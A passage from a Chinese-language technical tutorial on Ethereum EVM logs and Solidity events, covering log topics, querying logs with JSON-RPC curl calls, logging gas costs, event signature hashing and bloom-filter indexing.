keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">log0</span><span class="token punctuation">(</span><span class="token number">0x0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">log1</span><span class="token punctuation">(</span><span class="token number">0x1</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">log2</span><span class="token punctuation">(</span><span class="token number">0x2</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">log3</span><span class="token punctuation">(</span><span class="token number">0x3</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> <span class="token number">0xc</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">log4</span><span class="token punctuation">(</span><span class="token number">0x4</span><span class="token punctuation">,</span> <span class="token number">0xa</span><span class="token punctuation">,</span> <span class="token number">0xb</span><span class="token punctuation">,</span> <span class="token number">0xc</span><span class="token punctuation">,</span> <span class="token number">0xd</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>该合约部署在 Rinkeby 测试网络上。创建此合约的交易是：<a href="https://rinkeby.etherscan.io/tx/0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1">https://rinkeby.etherscan.io/tx/0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1</a></p><p>单击“Event Logs”选项，您应该会看到 5 个日志项的原始数据。</p><p>主题都是 32 字节。我们记录为数据的数字被编码为 32 字节的数字。</p><h2 id="Querying-For-The-Logs"><a href="#Querying-For-The-Logs" class="headerlink" title="Querying For The Logs"></a>Querying For The Logs</h2><p>让我们使用以太坊的 JSON RPC 来查询这些日志。以太坊 API 节点将创建索引，以便通过匹配主题来高效查找日志，或查找由合约地址生成的日志。</p><p>我们将使用 <a href="https://infura.io/">infura.io</a> 提供的托管 RPC 节点。您可以通过注册免费帐户来获取 API 密钥。</p><p>获得密钥后，设置 shell 变量 <code>INFURA_KEY</code>​ 以使以下 curl 示例正常工作：</p><p>举个简单的例子，让我们调用 <a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#eth_getlogs">eth_getLogs</a> 来获取与合约相关的所有日志：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"https://rinkeby.infura.io/<span class="token variable">$INFURA_KEY</span>"</span> <span class="token punctuation">\</span>  -X POST <span class="token punctuation">\</span>  -H <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>  --data <span class="token string">'&#123;  "jsonrpc": "2.0",  "id": 1,  "method": "eth_getLogs",  "params": [&#123;    "fromBlock": "0x0",    "address": "0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0"  &#125;]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>fromBlock</code>​：从哪个块开始寻找日志。默认情况下，它开始查看区块链的顶端。我们想要所有的日志，所以我们从第一个块开始。</li><li><code>address</code>​：日志是通过合约地址来索引的，所以这实际上是非常有效的。</li></ul><p>输出是 etherscan 为“Event Logs”选项显示的基础数据。查看完整输出：<a href="https://gist.github.com/hayeah/fbc862a87534bc45e77eddea9d779847">evmlog.json</a>。</p><p>JSON API 返回的日志项如下所示：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span><span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0"</span><span class="token punctuation">,</span><span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000a"</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000001"</span><span class="token punctuation">,</span><span class="token property">"blockNumber"</span><span class="token operator">:</span> <span class="token string">"0x179097"</span><span class="token punctuation">,</span><span class="token property">"transactionHash"</span><span class="token operator">:</span> <span class="token string">"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1"</span><span class="token punctuation">,</span><span class="token property">"transactionIndex"</span><span class="token operator">:</span> <span class="token string">"0x1"</span><span class="token punctuation">,</span><span class="token property">"blockHash"</span><span class="token operator">:</span> <span class="token string">"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57"</span><span class="token punctuation">,</span><span class="token property">"logIndex"</span><span class="token operator">:</span> <span class="token string">"0x2"</span><span class="token punctuation">,</span><span class="token property">"removed"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>接下来，我们可以查询匹配主题“0xc”的日志：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"https://rinkeby.infura.io/<span class="token variable">$INFURA_KEY</span>"</span> <span class="token punctuation">\</span>  -X POST <span class="token punctuation">\</span>  -H <span class="token string">"Content-Type: application/json"</span> <span class="token punctuation">\</span>  --data <span class="token string">'&#123;  "jsonrpc": "2.0",  "id": 1,  "method": "eth_getLogs",  "params": [&#123;    "fromBlock": "0x179097",    "toBlock": "0x179097",    "address": "0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0",    "topics": [null, null, "0x000000000000000000000000000000000000000000000000000000000000000c"]  &#125;]&#125;'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><ul><li><code>topics</code>​：要匹配的主题数组。<code>null</code>​ 匹配任何东西。见<a href="https://github.com/ethereum/wiki/wiki/JSON-RPC#parameters-38">详细说明</a>。</li></ul><p>应该有两个匹配的日志：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>    <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0"</span><span class="token punctuation">,</span>    <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000a"</span><span class="token punctuation">,</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000b"</span><span class="token punctuation">,</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000c"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000003"</span><span class="token punctuation">,</span>    <span class="token property">"blockNumber"</span><span class="token operator">:</span> <span class="token string">"0x179097"</span><span class="token punctuation">,</span>    <span class="token property">"transactionHash"</span><span class="token operator">:</span> <span class="token string">"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1"</span><span class="token punctuation">,</span>    <span class="token property">"transactionIndex"</span><span class="token operator">:</span> <span class="token string">"0x1"</span><span class="token punctuation">,</span>    <span class="token property">"blockHash"</span><span class="token operator">:</span> <span class="token string">"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57"</span><span class="token punctuation">,</span>    <span class="token property">"logIndex"</span><span class="token operator">:</span> <span class="token string">"0x4"</span><span class="token punctuation">,</span>    <span class="token property">"removed"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>    <span class="token property">"address"</span><span class="token operator">:</span> <span class="token string">"0x507e86b11541bcb1f3fe200b2f10ed8fd9413bd0"</span><span class="token punctuation">,</span>    <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000a"</span><span class="token punctuation">,</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000b"</span><span class="token punctuation">,</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000c"</span><span class="token punctuation">,</span>        <span class="token string">"0x000000000000000000000000000000000000000000000000000000000000000d"</span>    <span class="token punctuation">]</span><span class="token punctuation">,</span>    <span class="token property">"data"</span><span class="token operator">:</span> <span class="token string">"0x0000000000000000000000000000000000000000000000000000000000000004"</span><span class="token punctuation">,</span>    <span class="token property">"blockNumber"</span><span class="token operator">:</span> <span class="token string">"0x179097"</span><span class="token punctuation">,</span>    <span class="token property">"transactionHash"</span><span class="token operator">:</span> <span class="token string">"0x0e88c5281bb38290ae2e9cd8588cd979bc92755605021e78550fbc4d130053d1"</span><span class="token punctuation">,</span>    <span class="token property">"transactionIndex"</span><span class="token operator">:</span> <span class="token string">"0x1"</span><span class="token punctuation">,</span>    <span class="token property">"blockHash"</span><span class="token operator">:</span> <span class="token string">"0x541bb92d8de24cad637717cdc43ae5e66d9d6193b9f964fbb6461f6727eb9e57"</span><span class="token punctuation">,</span>    <span class="token property">"logIndex"</span><span class="token operator">:</span> <span class="token string">"0x5"</span><span class="token punctuation">,</span>    <span class="token property">"removed"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Logging-Gas-Costs"><a href="#Logging-Gas-Costs" class="headerlink" title="Logging Gas Costs"></a>Logging Gas Costs</h2><p>日志原语的 gas 费用取决于您拥有多少主题以及您记录了多少数据：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// Per byte <span class="token keyword">in</span> a LOG operation's dataLogDataGas       uint64 <span class="token operator">=</span> <span class="token number">8</span>// Per LOG topicLogTopicGas uint64 <span class="token operator">=</span> <span class="token number">375</span>   // Per LOG operation.LogGas           uint64 <span class="token operator">=</span> <span class="token number">375</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这些常量在 <a href="https://github.com/ethereum/go-ethereum/blob/a139041d409d0ffaf81c7cf931c6b24299a05705/params/protocol_params.go#L25">protocol_params</a> 中定义。</p><p>不要忘记使用的内存，即每字节 3 gas：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">MemoryGas        uint64 <span class="token operator">=</span> <span class="token number">3</span>  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>等什么？每字节日志数据只花费 8 gas？也就是说 32 个字节需要 256 个 gas，内存使用需要 96 个 gas。因此，322 gas 与 20000 gas 存储相同数量的数据，成本仅为 1.7%！</p><p>但是等一下，如果你将日志数据作为 calldata 传递给交易，你也需要为交易数据付费。 calldata 的 gas 成本为：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">TxDataZeroGas      uint64 <span class="token operator">=</span> <span class="token number">4</span>     // zero tx data abyteTxDataNonZeroGas   uint64 <span class="token operator">=</span> <span class="token number">68</span>    // non-zero tx data byte<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>假设所有 32 个字节都不为零，这仍然比存储便宜很多：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">// cost of <span class="token number">32</span> bytes of log data<span class="token number">32</span> * <span class="token number">68</span> <span class="token operator">=</span> <span class="token number">2176</span> // tx data cost<span class="token number">32</span> * <span class="token number">8</span> <span class="token operator">=</span> <span class="token number">256</span> // log data cost<span class="token number">32</span> * <span class="token number">3</span> <span class="token operator">=</span> <span class="token number">96</span> // memory usage cost<span class="token number">375</span> // log call cost----total <span class="token punctuation">(</span><span class="token number">2176</span> + <span class="token number">256</span> + <span class="token number">96</span> + <span class="token number">375</span><span class="token punctuation">)</span>~14% of sstore <span class="token keyword">for</span> <span class="token number">32</span> bytes<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>大部分 gas 费用实际上都花在了交易数据上，而不是日志操作本身。</p><p>日志操作便宜的原因是日志数据并没有真正存储在区块链中。原则上，日志可以根据需要即时重新计算。尤其是矿工，可以简单地丢弃日志数据，因为未来的计算无论如何都无法访问过去的日志。</p><p>整个网络不承担日志成本。只有 API 服务节点需要实际处理、存储和索引日志。</p><p>所以日志的成本结构只是防止日志垃圾邮件(spamming)的最小成本。</p><h2 id="Solidity-Events-1"><a href="#Solidity-Events-1" class="headerlink" title="Solidity Events"></a>Solidity Events</h2><p>了解了日志原语是如何工作的，Solidity 事件就很简单了。</p><p>让我们看一下采用 3 个 uint256 参数（非索引）的 <code>Log</code>​ 事件类型：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">,</span> <span class="token builtin">uint256</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">,</span> <span class="token builtin">uint256</span> c<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">Log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>与其查看汇编代码，不如查看生成的原始日志。</p><p>这是一个调用 <code>log(1, 2, 3)</code>​ 的交易：<a href="https://rinkeby.etherscan.io/tx/0x9d3d394867330ae75d7153def724d062b474b0feb1f824fe1ff79e772393d395">https://rinkeby.etherscan.io/tx/0x9d3d394867330ae75d7153def724d062b474b0feb1f824fe1ff79e772393d395</a></p><p>日志数据中的 data 是事件参数，ABI 编码：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>只有一个 topic，一个神秘的 32 字节哈希：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f0<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>这是事件类型签名的 SHA3 哈希：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># Install pyethereum </span><span class="token comment"># https://github.com/ethereum/pyethereum/#installation</span><span class="token operator">></span> from ethereum.utils <span class="token function">import</span> sha3<span class="token operator">></span> sha3<span class="token punctuation">(</span><span class="token string">"Log(uint256,uint256,uint256)"</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f0'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>这与方法调用的 ABI 编码的工作方式非常相似。</p><p>因为 Solidity 事件使用一个主题作为事件签名，所以索引参数只剩下 3 个主题。</p><h2 id="Solidity-Event-With-Indexed-Arguments"><a href="#Solidity-Event-With-Indexed-Arguments" class="headerlink" title="Solidity Event With Indexed Arguments"></a>Solidity Event With Indexed Arguments</h2><p>让我们看一个具有一个 indexed <code>uint256</code>​ 参数的事件：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> <span class="token keyword">indexed</span> b<span class="token punctuation">,</span> <span class="token builtin">uint256</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token builtin">uint256</span> a<span class="token punctuation">,</span> <span class="token builtin">uint256</span> b<span class="token punctuation">,</span> <span class="token builtin">uint256</span> c<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">Log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>生成的事件日志中现在有两个 topic：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0x00032a912636b05d31af43f00b91359ddcfddebcffa7c15470a13ba1992e10f00x0000000000000000000000000000000000000000000000000000000000000002<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><ul><li>第一个主题是事件类型签名，哈希后的。</li><li>第二个主题是索引参数，原值。</li></ul><p>数据是 ABI 编码的事件参数，不包括索引参数(indexed parameters)：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">00000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000003<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><h2 id="String-x2F-Bytes-Event-Parameter"><a href="#String-x2F-Bytes-Event-Parameter" class="headerlink" title="String&#x2F;Bytes Event Parameter"></a>String&#x2F;Bytes Event Parameter</h2><p>现在让我们将事件参数更改为字符串：</p><figure><div class="code-wrapper"><pre class="line-numbers language-solidity" data-language="solidity"><code class="language-solidity"><span class="token keyword">pragma</span> <span class="token keyword">solidity</span> <span class="token operator">^</span><span class="token version number">0.4.18</span><span class="token punctuation">;</span><span class="token keyword">contract</span> <span class="token class-name">Logger</span> <span class="token punctuation">&#123;</span><span class="token keyword">event</span> <span class="token function">Log</span><span class="token punctuation">(</span><span class="token builtin">string</span> a<span class="token punctuation">,</span> <span class="token builtin">string</span> <span class="token keyword">indexed</span> b<span class="token punctuation">,</span> <span class="token builtin">string</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function">log</span><span class="token punctuation">(</span><span class="token builtin">string</span> a<span class="token punctuation">,</span> <span class="token builtin">string</span> b<span class="token punctuation">,</span> <span class="token builtin">string</span> c<span class="token punctuation">)</span> <span class="token keyword">public</span> <span class="token punctuation">&#123;</span><span class="token function">Log</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>使用 <code>log(&quot;a&quot;, &quot;b&quot;, &quot;c&quot;)</code>​ 生成日志。交易是：<a href="https://rinkeby.etherscan.io/tx/0x21221c2924bbf1860db9e098ab98b3fd7a5de24dd68bab1ea9ce19ae9c303b56">https://rinkeby.etherscan.io/tx/0x21221c2924bbf1860db9e098ab98b3fd7a5de24dd68bab1ea9ce19ae9c303b56</a></p><p>有两个主题：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">0xb857d3ea78d03217f929ae616bf22aea6a354b78e5027773679b7b4a6f66e86b0xb5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><ul><li>第一个主题还是方法签名。</li><li>第二个主题是字符串参数的 sha256 摘要。</li></ul><p>让我们验证“b”的哈希是否与第二个主题相同：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token operator">>></span><span class="token operator">></span> sha3<span class="token punctuation">(</span><span class="token string">"b"</span><span class="token punctuation">)</span>.hex<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token string">'b5553de315e0edf504d9150af82dafa5c4667fa618ed0a6f19c69b41166c5510'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></figure><p>日志数据是 ABI 编码的两个非索引字符串“a”和“c”：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000001<span class="token number">6100000000000000000000000000000000000000000000000000000000000000</span>0000000000000000000000000000000000000000000000000000000000000001<span class="token number">6300000000000000000000000000000000000000000000000000000000000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>不幸的是，索引字符串参数的原始字符串没有存储（因为使用的是哈希），因此 DApp 客户端无法恢复它。</p><p>如果您真的需要原始字符串，只需记录两次，包括索引和非索引：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">event Log<span class="token punctuation">(</span>string a, string indexed indexedB, string b<span class="token punctuation">)</span><span class="token punctuation">;</span>Log<span class="token punctuation">(</span><span class="token string">"a"</span>, <span class="token string">"b"</span>, <span class="token string">"b"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><h2 id="Query-For-Logs-Efficiently"><a href="#Query-For-Logs-Efficiently" class="headerlink" title="Query For Logs Efficiently"></a>Query For Logs Efficiently</h2><p>我们如何找到第一个主题匹配“0x000…001”的所有日志？我们可以从创世块开始，重新执行每一笔交易，看看生成的日志是否符合我们的过滤条件。这不好。</p><p>事实证明，区块头(block header)包含了足够的信息，让我们可以快速跳过没有我们想要的日志的块。</p><p>区块头包括父哈希、叔父哈希币库(coin base)和用于该区块中包含的交易生成的所有日志的布隆过滤器等信息。看起来像：</p><figure><div class="code-wrapper"><pre class="line-numbers language-json" data-language="json"><code class="language-json">type Header struct <span class="token punctuation">&#123;</span>    ParentHash  common.Hash    `json<span class="token operator">:</span><span class="token string">"parentHash"</span>       gencodec<span class="token operator">:</span><span class="token string">"required"</span>`    UncleHash   common.Hash    `json<span class="token operator">:</span><span class="token string">"sha3Uncles"</span>       gencodec<span class="token operator">:</span><span class="token string">"required"</span>`    Coinbase    common.Address `json<span class="token operator">:</span><span class="token string">"miner"</span>            gencodec<span class="token operator">:</span><span class="token string">"required"</span>`    <span class="token comment">// ...</span>    <span class="token comment">// The Bloom filter composed from indexable information (logger address and log topics) contained in each log entry from the receipt of each transaction in the transactions list</span>    Bloom       Bloom          `json<span class="token operator">:</span><span class="token string">"logsBloom"</span>        gencodec<span class="token operator">:</span><span class="token string">"required"</span>`<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p><a href="https://sourcegraph.com/github.com/ethereum/go-ethereum@479aa61f11724560c63a7b56084259552892819d/-/blob/core/types/block.go#L70:1">https:&#x2F;&#x2F;sourcegraph.com&#x2F;github.com&#x2F;ethereum&#x2F;go-ethereum@479aa61f11724560c63a7b56084259552892819d&#x2F;-&#x2F;blob&#x2F;core&#x2F;types&#x2F;block.go#L70:1</a></p><p>布隆过滤器是一个固定的 256 字节数据结构。它的行为类似于 set，您可以询问它是否存在某个主题。</p><p>所以我们可以这样优化日志查询流程：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token keyword">for</span> <span class="token for-or-select variable">block</span> <span class="token keyword">in</span> chain:    <span class="token comment"># check bloom filter to filter out a block quickly</span>    <span class="token keyword">if</span> not block.Bloom.exist<span class="token punctuation">(</span>topic<span class="token punctuation">)</span>:        next    <span class="token comment"># block might have the log we want, re-execute</span>    <span class="token keyword">for</span> <span class="token for-or-select variable">tx</span> <span class="token keyword">in</span> block.transactions:        <span class="token keyword">for</span> <span class="token for-or-select variable">log</span> <span class="token keyword">in</span> tx.recalculateLogs<span class="token punctuation">(</span><span class="token punctuation">)</span>:            <span class="token keyword">if</span> log.topic<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>.matches<span class="token punctuation">(</span>topic<span class="token punctuation">)</span>                yield log<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></figure><p>除了主题之外，发出日志的合约地址也被添加到布隆过滤器中。</p><h2 id="BloomBitsTrie"><a href="#BloomBitsTrie" class="headerlink" title="BloomBitsTrie"></a>BloomBitsTrie</h2><p>以太坊主网在 2018 年 1 月有大约 5,000,000 个区块，迭代所有区块仍然非常昂贵，因为您需要从磁盘加载区块头。</p><p>平均块头约为 500 字节，您总共将加载 2.5GB 的数据。</p><p><a href="https://github.com/zsfelfoldi">Felföldi Zsolt</a> 在 <a href="https://github.com/ethereum/go-ethereum/pull/14970">PR #14970</a> 中实现了 BloomBitsTrie，以使日志过滤更快。其思想是，与其单独查看每个块的布隆过滤器，不如设计一个同时查看 32768 个块的数据结构。</p><p>要理解接下来的内容，您需要了解的关于布隆过滤器的最少信息是，将一段数据“哈希”为布隆过滤器中的 3 个随机（但确定性）位并将它们设置为 1。为了检查是否存在，我们检查这 3 位是否设置为 1。</p><p>以太坊中使用的布隆过滤器是 2048 位。</p><p>假设主题“0xa”将布隆过滤器的第 16、632 和 777 位设置为 1。BloomBits Trie 是 2048 x 32768 位图(bitmap)。对 <code>BloomBits</code>​ 结构进行索引为我们提供了三个 32768 位向量：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">BloomBits<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">32768</span> bit vector <span class="token punctuation">(</span><span class="token number">4096</span> byte<span class="token punctuation">)</span>BloomBits<span class="token punctuation">[</span><span class="token number">631</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">32768</span> bit vector <span class="token punctuation">(</span><span class="token number">4096</span> byte<span class="token punctuation">)</span>BloomBits<span class="token punctuation">[</span><span class="token number">776</span><span class="token punctuation">]</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token number">32768</span> bit vector <span class="token punctuation">(</span><span class="token number">4096</span> byte<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><p>这些位向量告诉我们哪些块的布隆过滤器的第 16、632 和 777 位设置为 1。</p><p>让我们看看这些向量的前 8 位，可能看起来像</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token number">10110001</span><span class="token punctuation">..</span>.00101101<span class="token punctuation">..</span>.<span class="token number">10101001</span><span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></div></figure><ul><li>第 1 个块的第 16 位和第 776 位设置为 1，但不是第 631 位。</li><li>第 3 个块设置了所有三个位。</li><li>第 8 个块设置了所有三个位。</li></ul><p>然后我们可以通过对这些向量应用二进制与来快速找到匹配所有三个位的块：</p><figure><div class="code-wrapper"><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">00100001<span class="token punctuation">..</span>.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></figure><p>最后的位向量准确地告诉我们 32768 中哪些块符合我们的过滤条件。</p><p>为了匹配多个主题，我们只需对每个主题进行相同的索引，然后将最终的位向量二进制和。</p><p>有关其工作原理的更多详细信息，请参阅 <a href="https://github.com/zsfelfoldi/go-ethereum/wiki/BloomBits-Trie">BloomBits Trie</a>。</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>总的来说，一个 EVM 日志最多可以有 4 个主题，以及任意数量的字节作为数据。 Solidity 事件的非索引参数被 